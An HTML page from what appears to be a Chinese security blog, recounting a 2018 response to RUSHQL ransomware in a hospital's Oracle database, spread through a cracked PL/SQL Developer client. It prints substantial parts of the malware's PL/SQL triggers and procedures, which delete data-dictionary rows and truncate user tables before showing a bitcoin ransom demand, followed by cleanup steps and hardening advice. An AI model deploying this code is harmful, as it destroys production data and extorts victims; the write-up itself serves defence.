@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Olist.213">
+  <meta name="description" content="一点牢骚">
+  
+  
+  <link rel="prev" href="https://olist213.github.io/posts/welcome/" />
+  <link rel="next" href="https://olist213.github.io/posts/virus/" />
+  <link rel="canonical" href="https://olist213.github.io/posts/blackmail_virus/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           记一次某医院勒索软件事件处理整理 | Olist.213
+       
+  </title>
+  <meta name="title" content="记一次某医院勒索软件事件处理整理 | Olist.213">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https://olist213.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "记一次某医院勒索软件事件处理整理",
+    "headline" : "记一次某医院勒索软件事件处理整理",
+    "description" : "之前的旧文章，换了hugo之后，重新拉过来，就拉这一篇，其他的就算了。
+ 起因 2018年的某天，公司接到某医院的电话，医院的后台和终端机出现数据库异常报错情况。
+基于这种紧急情况，公司立马出动应急人员，赶到客户现场。
+到现场，初步了解情况之后，通过沟通以及对报错信息进行分析，后台报错如下:
+（你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.）  初步判断为Ransom_RUSHQL.A勒索病毒。这种病毒针对oracle数据库，通过一定的条件触发，并最终锁死数据库，从而引发数据库宕机。
+由于是生产库，所以我们最终需要做的就是处理掉病毒，对数据进行恢复。
+病毒如下：
+-- -- Copyright (c) 1988, 2011, Oracle and/or its affiliates. -- All rights reserved.",
+    "inLanguage" : "en-us",
+    "author" : "Olist.213",
+    "creator" : "Olist.213",
+    "publisher": "Olist.213",
+    "accountablePerson" : "Olist.213",
+    "copyrightHolder" : "Olist.213",
+    "copyrightYear" : "2019",
+    "datePublished": "2019-01-21 10:50:31 &#43;0800 CST",
+    "dateModified" : "2019-01-21 10:50:31 &#43;0800 CST",
+    "url" : "https://olist213.github.io/posts/blackmail_virus/",
+    "wordCount" : "982",
+    "keywords" : [ "病毒", "Olist.213"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/cyber_security/" title="">Cyber&#39;security</a>
+                
+                <a class="menu-item" href="/my_life/" title="">My&#39;life</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/cyber_security/" title="">Cyber&#39;security</a>
+                
+                <a class="menu-item" href="/my_life/" title="">My&#39;life</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">记一次某医院勒索软件事件处理整理</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://olist213.github.io" rel="author">Olist.213</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2019-01-21 itemprop="datePublished">January 21, 2019</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<blockquote>
+<p>之前的旧文章，换了hugo之后，重新拉过来，就拉这一篇，其他的就算了。</p>
+</blockquote>
+
+<h2 id="起因">起因</h2>
+
+<p>2018年的某天，公司接到某医院的电话，医院的后台和终端机出现数据库异常报错情况。</p>
+
+<p>基于这种紧急情况，公司立马出动应急人员，赶到客户现场。</p>
+
+<p>到现场，初步了解情况之后，通过沟通以及对报错信息进行分析，后台报错如下:</p>
+
+<pre><code class="language-sql">（你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.）
+</code></pre>
+
+<p>初步判断为<code>Ransom_RUSHQL.A</code>勒索病毒。这种病毒针对oracle数据库，通过一定的条件触发，并最终锁死数据库，从而引发数据库宕机。</p>
+
+<p>由于是生产库，所以我们最终需要做的就是处理掉病毒，对数据进行恢复。</p>
+
+<p><strong>病毒如下：</strong></p>
+
+<pre><code class="language-sql">--
+-- Copyright (c) 1988, 2011, Oracle and/or its affiliates. 
+-- All rights reserved. 
+--
+-- NAME
+--   login.sql
+--
+-- DESCRIPTION
+--   PL/SQL global login &quot;site profile&quot; file
+--
+--   Add any PL/SQL commands here that are to be executed when a
+--   user starts PL/SQL, or uses the PL/SQL CONNECT command.
+--
+-- USAGE
+--   This script is automatically run
+--
+
+..............此处为恶意软件混淆的官方声明,非官方声明......................
+
+-- This SQL was created by Oracle ; You should never remove/delete it!
+
+--     MODIFIED   (MM/DD/YY)
+--     esoyleme   02/27/02 - remove xumuts.plb
+--     rburns     02/20/02 - re-validate catalog
+--     rburns     02/11/02 - add registry version
+--     rpang      01/25/02 - add UTL_GDK
+--     esoyleme   01/23/02 - bring in changes from oraolap
+
+..............此处内容过多，省略......................
+            
+--     akruglik   05/06/98 -  add tabfragobj# to lobfrag$ and 
+--                            tabpartobj# to lobcomppart$
+--     nagarwal   05/02/98 -  create indexes on operator catalogs
+--     akruglik   05/01/98 -  add defbufpool to PARTLOB$ and LOBCOMPPART$       
+--     syeung     04/27/98 -  remove type# from tabcompart$ and indcompart$ and
+--                            make deflists and defgroups nullable
+
+create or replace procedure &quot;DBMS_SUPPORT_INTERNAL         &quot; wrapped 
+a000000
+354
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+7
+6f2 467
+..........对加密数据进行省略..............
+
+/
+PROMPT Create &quot;DBMS_SUPPORT_INTERNAL         &quot;
+create or replace trigger &quot;DBMS_SUPPORT_INTERNAL         &quot;
+after startup on database 
+begin
+ &quot;DBMS_SUPPORT_INTERNAL         &quot;;
+end;
+/
+CREATE OR REPLACE procedure  &quot;DBMS_SYSTEM_INTERNAL         &quot; wrapped 
+a000000
+354
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+7
+3a5 384
+..........对加密数据进行省略..............
+/
+CREATE OR REPLACE TRIGGER &quot;DBMS_SYSTEM_INTERNAL         &quot;
+  AFTER LOGON ON DATABASE
+BEGIN
+ &quot;DBMS_SYSTEM_INTERNAL         &quot;;
+END;
+/
+create or replace procedure DBMS_STANDARD_FUN9 wrapped 
+a000000
+354
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+7
+69 9a
+..........对加密数据进行省略..............
+
+/
+create or replace procedure &quot;DBMS_CORE_INTERNAL         &quot; wrapped 
+a000000
+354
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+abcd
+7
+73c 4c4
+
+..........对加密数据进行省略..............
+
+/
+CREATE OR REPLACE TRIGGER &quot;DBMS_CORE_INTERNAL         &quot;
+  AFTER LOGON ON SCHEMA
+BEGIN 
+  &quot;DBMS_CORE_INTERNAL         &quot;;
+END;
+/
+</code></pre>
+
+<p>该文件就是PLSQL客户端的sql文件，文件名为AfterConnect.sql，这个文件官方的软件包中为空（无内容），被篡改过的客户端中包含了连接数据库的恶意代码。</p>
+
+<p>数据库启动后执行触发器<code>DBMS_SUPPORT_INTERNAL</code></p>
+
+<pre><code class="language-sql">PROCEDURE &quot;DBMS_SUPPORT_INTERNAL         &quot; IS  
+DATE1 INT :=10;
+E1 EXCEPTION;
+ PRAGMA EXCEPTION_INIT(E1, -20312);
+BEGIN
+   SELECT NVL(TO_CHAR(SYSDATE-CREATED ),0) INTO DATE1 FROM V$DATABASE;
+   IF (DATE1&gt;=1200) THEN
+   EXECUTE IMMEDIATE 'create table ORACHK'||SUBSTR(SYS_GUID,10)||' tablespace system  as select * from sys.tab$';
+   DELETE SYS.TAB$ WHERE DATAOBJ# IN (SELECT DATAOBJ# FROM SYS.OBJ$ WHERE OWNER# NOT IN (0,38)) ;
+   COMMIT;
+   
+............省略.................
+
+   FOR I IN 1..2046 LOOP
+   DBMS_SYSTEM.KSDWRT(2, 'Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
+   DBMS_SYSTEM.KSDWRT(2, '你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 ');
+   END LOOP;
+   RAISE E1;
+   END IF;
+   EXCEPTION
+  WHEN E1 THEN
+    RAISE_APPLICATION_ERROR(-20312,'你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
+  WHEN OTHERS THEN
+    NULL;
+END;
+</code></pre>
+
+<p><strong>该文件的作用</strong></p>
+
+<ul>
+<li>当数据库文件创建大于1200天，就开始备份<code>TAB$表</code>。</li>
+<li>删除<code>TAB$</code>中除<code>OWNER#</code>为(0,,38)的记录。</li>
+<li>通过<code>SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION</code>清除备份信息。</li>
+<li>然后通过<code>DBMS_SYSTEM.KSDWRT</code>在你的alert日志中写入2046次提示信息。</li>
+<li>在抛出一个前台类似的信息。</li>
+</ul>
+
+<p>**数据库登录触发器<code>DBMS_SYSTEM_INTERNAL</code> **</p>
+
+<pre><code class="language-sql">PROCEDURE &quot;DBMS_SYSTEM_INTERNAL         &quot; IS
+  DATE1 INT :=10;
+  E1 EXCEPTION;
+  PRAGMA EXCEPTION_INIT(E1, -20313);
+BEGIN
+   SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN ('SYSTEM','SYSAUX','EXAMPLE');
+   IF (DATE1&gt;=1200) THEN
+    IF (UPPER(SYS_CONTEXT('USERENV', 'MODULE'))!='C89239.EXE')
+     THEN
+      RAISE E1;
+    END IF;
+    END IF;
+EXCEPTION
+  WHEN E1 THEN
+    RAISE_APPLICATION_ERROR(-20313,'你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
+  WHEN OTHERS THEN
+    NULL;
+END;
+
+............省略.................
+
+</code></pre>
+
+<p><strong>该文件的作用</strong></p>
+
+<ul>
+<li><p>当你的非<code>SYSTEM','SYSAUX','EXAMPLE'</code>之外的所有表的最小统计时间为1200天，并且非<code>C89239.EXE</code>程序,将对数据库进行锁定</p></li>
+
+<li><p>提示你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.。</p></li>
+</ul>
+
+<p><strong>数据库触发器<code>DBMS_CORE_INTERNAL</code></strong></p>
+
+<pre><code class="language-sql">PROCEDURE &quot;DBMS_CORE_INTERNAL         &quot; IS
+  V_JOB   NUMBER;
+  DATE1 INT :=10;
+  STAT VARCHAR2(2000);
+  V_MODULE VARCHAR2(2000);
+  E1 EXCEPTION;
+  PRAGMA EXCEPTION_INIT(E1, -20315);
+  CURSOR TLIST IS SELECT * FROM USER_TABLES WHERE TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE '%ORACHK%' AND CLUSTER_NAME IS NULL;
+BEGIN
+   SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN ('SYSTEM','SYSAUX','EXAMPLE');
+   IF (DATE1&gt;=1200) THEN
+    FOR I IN TLIST LOOP
+    DBMS_OUTPUT.PUT_LINE('table_name is ' ||I.TABLE_NAME);
+    STAT:='truncate table '||USER||'.'||I.TABLE_NAME;
+    DBMS_JOB.SUBMIT(V_JOB, 'DBMS_STANDARD_FUN9(''' || STAT || ''');', SYSDATE);
+    COMMIT;
+    END LOOP;
+    END IF; 
+        IF (UPPER(SYS_CONTEXT('USERENV', 'MODULE'))!='C89239.EXE')
+     THEN
+      RAISE E1;
+    END IF;	
+	
+EXCEPTION
+  WHEN E1 THEN
+    RAISE_APPLICATION_ERROR(-20315,'你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');
+  WHEN OTHERS THEN
+    RAISE_APPLICATION_ERROR(-20315,'你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.');    
+END;	
+
+
+............省略.................
+</code></pre>
+
+<p><strong>该文件的作用</strong></p>
+
+<ul>
+<li>将表明不含<code>$</code>、不含<code>ORACHK</code>的表放到一个游标里面，当你的非<code>SYSTEM','SYSAUX','EXAMPLE'</code>之外的所有表的最小统计时间为1200天就执行执行<code>truncate table</code>操作，并且登录程序非<code>C89239.EXE</code>程序,则报出异常。</li>
+</ul>
+
+<h2 id="勒索病毒如何感染数据库">勒索病毒如何感染数据库？</h2>
+
+<p>根据勒索病毒特性，进一步分析，由于运维人员使用绿色版PLSQL Developer 11.06中文绿色注册版(免Oracle11g客户端)，然后连接数据库，导致数据库内被自动注入存储过程、触发器以及几千万个JOBS。</p>
+
+<p>大家都清楚，绿色版的软件也称作破解软件，破解人员对官方软件进行修改之后重新发布的，如果你没有用正版软件的习惯，习惯下载破解软件，而不验证软件有无恶意，很容易中招。在这里也提醒大家，尽量使用正版软件，验证来源软件的签名，特别是在连接客户的真实环境的情况下，接触重要数据的情况下。</p>
+
+<h2 id="如何对数据进行恢复">如何对数据进行恢复</h2>
+
+<p>客户发现的及时，并未对生成库造成锁定的影响，这时我们还是可以恢复的，通过清除勒索软件产生的垃圾数据，并通过备份进行数据还原，可以及时对数据进行恢复。（建议先在测试环境中，先进行测试，测试环境成功之后，再在生产系统中操作。）</p>
+
+<p>1、<code>alter system set job_queue_process=0 scope=both ;</code>并重启<code>db</code>。重启是由于此时数据库存在大量的<code>library cache lock</code>，无法操作。</p>
+
+<p>2、删除上述的存储过程和触发器</p>
+
+<pre><code class="language-sql">drop trigger xxx.&quot;DBMS_CORE_INTERNAL         &quot; ;
+drop trigger xxx.&quot;DBMS_SUPPORT_INTERNAL         &quot; ;
+drop trigger xxx.&quot;DBMS_SYSTEM_INTERNAL         &quot; ;
+ 
+drop PROCEDURE xxx.&quot;DBMS_CORE_INTERNAL         &quot; ;
+drop PROCEDURE xxx.&quot;DBMS_SUPPORT_INTERNAL         &quot; ;
+drop PROCEDURE xxx.&quot;DBMS_SYSTEM_INTERNAL         &quot; ;
+</code></pre>
+
+<p><strong>注意后面的九个空格(x为空格)（<code>DBMS_SYSTEM_INTERNALxxxxxxxxx</code>）</strong></p>
+
+<p>3、删除黑客创建的大量jobs</p>
+
+<pre><code class="language-sql">select 'exec dbms_ijob.remove('||job||');' 
+from xxx 
+where schema_user='xxx' and what like '%truncate%';
+</code></pre>
+
+<p>4、确认被truncate的表，确认数据是否丢失。</p>
+
+<p>5、如果测试环境测试正常，可以对生成数据库进行同样的操作。</p>
+
+<h2 id="残余风险">残余风险</h2>
+
+<ul>
+<li>删除job记录可能导致某些数据不能读取或丢失。</li>
+<li>不能完全确认是否还有运维开发人员在使用带有勒索病毒的PLSQL Developer客户端。</li>
+<li>数据库管理权限不分明，DDL操作审核不严格。</li>
+</ul>
+
+<h2 id="安全建设建议">安全建设建议</h2>
+
+<ul>
+<li>在业务恢复之后，对关键资产、代码进行安全检查，扫描非法程序、高风险操作代码，及时排除残留风险。</li>
+<li>在日常的运维管理中，通过制度和运维管理平台对运维管理人员的操作进行记录并审计，使用客户提供的终端和工具对数据库进行操作。</li>
+<li>管理数据库的运维管理工具应从官方的渠道下载，在使用前需要对管理工具进行检测，禁止使用盗版工具对数据库进行操作。</li>
+<li>建议建立健全关键资产管控，敏感资产管控，高风险操作管控，特权用户操作管控，同时对运维人员的DDL审核，并对可以创建触发器、存储过程的行为进行审核及管控，防止非法程序侵入。</li>
+<li>建议建立健全灾备系统，相关备份策略、恢复测试流程、恢复测试案例。</li>
+<li>定期进行容灾演练、场景演练、恢复测试、入侵用例恢复测试，尽可能缩短恢复时间</li>
+</ul>
+
+<p><strong>参考</strong></p>
+
+<p><a href="http://www.killdb.com/2017/02/12/%E6%AF%94%E7%89%B9%E5%B8%81%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B%E9%87%8D%E7%8E%B0%E6%B1%9F%E6%B9%96.html">比特币攻击案例重现江湖</a></p>
+
+<p><a href="http://www.xifenfei.com/2016/11/plsql-dev-hacker-bitcoin.html">plsql dev引起的数据库被黑勒索比特币实现原理分析和解决方案</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Olist.213 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://olist213.github.io/posts/blackmail_virus/>https://olist213.github.io/posts/blackmail_virus/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="https://olist213.github.io/tags/%E7%97%85%E6%AF%92/">
+                    #病毒</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://olist213.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://olist213.github.io/posts/welcome/" class="prev" rel="prev" title="Welcome"><i class="iconfont icon-left"></i>&nbsp;Welcome</a>
+         
+        
+        <a href="https://olist213.github.io/posts/virus/" class="next" rel="next" title="勒索病毒防护建议">勒索病毒防护建议&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
